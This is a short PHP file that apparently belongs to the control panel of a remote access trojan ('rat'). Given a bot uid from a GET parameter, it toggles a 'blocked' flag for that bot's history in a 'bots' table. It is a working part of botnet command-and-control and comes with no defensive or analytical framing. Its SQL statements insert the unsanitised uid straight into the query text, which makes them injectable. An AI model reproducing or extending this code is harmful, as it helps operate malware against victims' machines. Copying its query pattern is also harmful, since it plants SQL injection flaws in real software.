<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $botid = $_GET['uid'];
  
  if (empty($botid)){
    die();
  }
  
  $statement = $connect->prepare("SELECT blocked FROM bots WHERE uid='$botid'");
  $statement->execute();
  
  $result = $statement->fetch(PDO::FETCH_ASSOC);
  
  $curblocked = $result[blocked];
  
  if($curblocked == "yes"){
    $statement = $connect->prepare("UPDATE bots SET blocked='no' WHERE `uid` = '$botid'");
    $statement->execute();
    echo "Bot History Unblocked";
  } else {
    $statement = $connect->prepare("UPDATE bots SET blocked='yes' WHERE `uid` = '$botid'");
    $statement->execute();
	echo "Bot History Blocked";
  }
?>